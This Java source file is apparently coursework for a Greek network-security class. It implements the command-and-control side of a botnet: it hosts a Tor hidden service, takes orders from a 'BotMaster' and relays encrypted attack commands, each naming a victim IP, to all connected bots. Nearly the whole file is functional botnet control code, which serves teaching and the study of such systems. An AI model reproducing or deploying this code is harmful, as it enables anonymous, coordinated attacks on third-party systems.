/**
 *    Ασφάλεια Δικτύων Υπολογιστών & Τεχνολογίες Προστασίας της Ιδιωτικότητας
 *                                   Άσκηση 2
 * Δημιουργία ασφαλούς διαύλου διαχείρισης botnet (C&C) με αξιοποίηση Tor και 
 * χρήση πρωτοκόλλου διασφάλισης εμπιστευτικότητας και ακεραιότητας
 * 
 *                      Πέππας Κωνσταντίνος 321/2011134
 *                      Σωτηρέλης Χρήστος   321/2012182
 *                      Χαϊκάλης Νικόλαος   321/2012200
 * 
 */

import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.SecretKey;
import javax.net.ssl.HandshakeCompletedEvent;
import javax.net.ssl.HandshakeCompletedListener;
import javax.swing.JTextArea;
import org.silvertunnel_ng.netlib.api.NetFactory;
import org.silvertunnel_ng.netlib.api.NetLayer;
import org.silvertunnel_ng.netlib.api.NetLayerIDs;
import org.silvertunnel_ng.netlib.api.NetSocket;
import org.silvertunnel_ng.netlib.layer.tor.TorHiddenServicePortPrivateNetAddress;
import org.silvertunnel_ng.netlib.layer.tor.TorHiddenServicePrivateNetAddress;
import org.silvertunnel_ng.netlib.layer.tor.TorNetLayerUtil;
import org.silvertunnel_ng.netlib.layer.tor.TorNetServerSocket;

/**
 *
 * Class pou edrewnw tin epikoinwnia tou C&C me ton BotMaster (start & stop)
 * kathos k dimiourgia tou chat anametaksi tous.
 */
public class ChatWithBotMaster implements Serializable{
    private int port; //Port pou sindeete o C&C me ton BotMaster.
    private NetSocket socket;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private boolean keepWalking = true;
    private Messages msgs = new Messages();
    private JTextArea Text;
    private Chat chating = new Chat();
    private ArrayList<ObjectOutputStream> Bots = new ArrayList(); //exun k OOS k socket.
    private MySSL myssl = new MySSL();
    private ArrayList<SecretKey> BotSecKey = new ArrayList(); 
    
    
    //An thelei o admin tu C&C borei na allaksei to port me ton BotMaster.
    public ChatWithBotMaster(int port, JTextArea Text) {
        this.port = port;
        this.Text = Text;
    }
    
    //Default times gia to port me ton BotMaster
    public ChatWithBotMaster(){
        port = 5555;
    }
    
    /**
     * Methodos pou arhizw to Connection me ton BotMaster
     * Dedomenou pws mono enas xristis borei na einai BotMaster kathe fora
     * den xrisimopoiw MultiThread Server gia tin epikoinwnia tou
     * C&C Server me ton BotMaster.
     */
    public void Start_Connection(){

        Text.append("Server waiting for BotMaster..." + "\n");
//            System.setProperty("javax.net.debug", "ssl:record");
          TOR();
//            System.out.println("Server waiting for BotMaster on port "+ port +"...");
        Chat_Thread.start();
       
    }
    
    
    /**
     * Methodos gia na stamatisume tin sindesi tou BotMaster me ton C&C Server.
     * O C&C den kleinei perimenei mexri na ksanasindethei o BotMaster i mexri 
     * na termatisei o admin tou C&C ton C&C.
     */
    public void Stop_Connection(){
        keepWalking = false;
        Chat_Thread.interrupt();
        try {
            if(oos != null) oos.close();
            if(ois != null) ois.close();
        } catch (IOException ex) {

        }
        try {
            if(socket !=null) socket.close();
        } catch (IOException ex) {
            return;
        }
//        System.out.println("keep: "+keepWalking);
    }
    
    /**
     * Dimiourgia enos thread pou tha xrisimopoiisw tin class chat
     * prokeimenou na dimiurgisw ena chat metaksi tou BotMaster kai tou
     * C&C Server.
     */
    private Thread Chat_Thread = new Thread(() -> {
        chating = new Chat(oos, ois, "BotMaster");
        chating.SendMessage(msgs.WelcomeMaster());
        Text.append(msgs.SendAsServer() + msgs.WelcomeMaster() + "\n");
        while(keepWalking == true){
            
            Object readObj = chating.readMessage();
            if(!(readObj.equals(""))){
                Text.append(msgs.SendAsBotMaster() + readObj.toString() + "\n");
            }
            

            if(readObj.toString().equalsIgnoreCase(msgs.StopConnection())){ //Kleinw to connection me ton BotMaster.
                /**
                * O BotMaster thelei na stamatisei to connection me ton C&C.
                * Auto omws den simainei pws tha kanume Stop k to attack
                * an ehei dwsei prin apo auto entoli gia attack.
                */
                chating.SendMessage(msgs.ByeMaster());
                Text.append(msgs.SendAsServer() + msgs.ByeMaster() + "\n");
                chating.SendMessage(msgs.StopConnection());
                Text.append(msgs.SendAsServer() + msgs.StopConnection() + "\n");
                Stop_Connection();
                //System.out.println(keepWalking);
            }
            else if(readObj.toString().equalsIgnoreCase(msgs.StopAttack())){ //Stamataw tin epithesi sto Victim.
                /**
                * Dinei entoli gia na stamatisei i attack. Den simainei pws kanei
                * logout apo ton server. Sinehizei na einai syndedemenos sto 
                * C&C server.
                */
                Text.append("Retreat my Bots ...\n");
                for(int i=0; i<Bots.size(); i++){
//                    System.out.println("oos gia attack: " + Bots.get(i));
                    System.out.println("SecKey stin CHATWITHBOTMASTER: " + BotSecKey.get(i));
                    Object tmp = msgs.StopAttack();
                    byte[] msg = myssl.EncryptWithSecKey(tmp, BotSecKey.get(i));
                    chating.SendBytesWithOOS(msg, Bots.get(i));
//                    System.out.println("attack");
                }
            }
            else if(readObj instanceof Attack_Properties){
                Attack_Properties ap = new Attack_Properties();
                ap = (Attack_Properties) readObj;
//                System.out.println("attacking ip : " + ap.getIP_Victim() + "\nsize: " + Bots.size());
                for(int i=0; i<Bots.size(); i++){
                    byte[] msg = myssl.EncryptWithSecKey(ap, BotSecKey.get(i));
//                    System.out.println("oos gia attack: " + Bots.get(i));
                    chating.SendBytesWithOOS(msg, Bots.get(i));
                    //System.out.println("attack");
                }
                Text.append("Bots Chargeeee !!!\n");
            }
            
//            System.out.println("BotMater> " + readObj.toString());

        }
    });
    
    //GETS:
    public int getPort() {
        return port;
    }

    public ObjectOutputStream getOos() {
        return oos;
    }

    public ObjectInputStream getOis() {
        return ois;
    }

    public NetSocket getSocket() {
        return socket;
    }

    public boolean keepWalking() {
        return keepWalking;
    }
    
    
    
    
    //SETS:
    public void setPort(int port) {
        this.port = port;
    }

    public void setOos(ObjectOutputStream oos) {
        this.oos = oos;
    }

    public void setOis(ObjectInputStream ois) {
        this.ois = ois;
    }

    public void keepWalking(boolean keepWalking) {
        this.keepWalking = keepWalking;
    }

    public void setBots(ArrayList<ObjectOutputStream> Bots) {
        this.Bots = Bots;
    }

    public void setBotSecKey(ArrayList<SecretKey> BotSecKey) {
        this.BotSecKey = BotSecKey;
    }
    

    
    

    public void sendBotList(ArrayList<Bot_Properties> botList) {

        for(int i=0; i<botList.size(); i++){
            System.out.println(botList.get(i).getBotPCname());
            System.out.println(botList.get(i).getBotIP());
        }
        if(!botList.isEmpty()){
            System.out.println("Stelnw lista." + botList);
            chating.SendMessage(botList);
        }
    }
    
    
    void TOR(){
         try {
            // create new private+public hidden service key
            TorNetLayerUtil torNetLayerUtil = TorNetLayerUtil.getInstance();
            TorHiddenServicePrivateNetAddress newNetAddress = torNetLayerUtil.createNewTorHiddenServicePrivateNetAddress();
//            System.out.println(newNetAddress.getPublicOnionHostname());
            Text.append("Onion: " + newNetAddress.getPublicOnionHostname() + "\n");
            
            File directory = new File("C:\\Users\\Alcohealism\\Documents\\NetBeansProjects\\Botnet TOR\\CnC (Server)\\onion"); 
            directory.mkdir();
            torNetLayerUtil.writeTorHiddenServicePrivateNetAddressToFiles(directory, newNetAddress);
            TorHiddenServicePrivateNetAddress netAddress = torNetLayerUtil.readTorHiddenServicePrivateNetAddressFromFiles(directory, true);
            TorHiddenServicePortPrivateNetAddress netAddressWithPort = new TorHiddenServicePortPrivateNetAddress(netAddress, port);
            NetLayer netLayer = NetFactory.getInstance().getNetLayerById(NetLayerIDs.TOR);
            netLayer.waitUntilReady();
            TorNetServerSocket netServerSocket = (TorNetServerSocket)netLayer.createNetServerSocket(null, netAddressWithPort);
            
            NetSocket netSocket = netServerSocket.accept();
            Text.append("TOR connection is ready.\n");
            System.out.println("Starting Connection with TOR");
            try {
                oos = new ObjectOutputStream(netSocket.getOutputStream());
                ois = new ObjectInputStream(netSocket.getInputStream());
                System.out.println(ois.readObject().toString());
            } catch (Exception e) {
                //close();
            }
            
        } catch (IOException ex) {
            Logger.getLogger(ChatWithBotMaster.class.getName()).log(Level.SEVERE, null, ex);
        }
         
        
    }
    
   
}//End class

class MyHandshakeListener implements HandshakeCompletedListener {
    
   public void handshakeCompleted(HandshakeCompletedEvent e) {
     System.out.println("Handshake succesful! from " + e.getSocket());
     System.out.println("Using cipher suite: " + e.getCipherSuite());
   }
}
